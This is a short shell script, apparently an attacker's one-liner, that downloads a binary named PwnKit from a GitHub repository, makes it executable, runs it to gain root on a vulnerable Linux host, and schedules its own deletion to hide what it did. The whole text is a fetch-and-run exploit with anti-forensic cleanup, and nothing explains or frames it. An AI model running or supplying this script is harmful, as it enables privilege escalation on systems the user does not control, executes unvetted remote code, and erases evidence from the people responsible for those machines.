curl -fsSL https://raw.githubusercontent.com/skkgrup/novel/refs/heads/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit
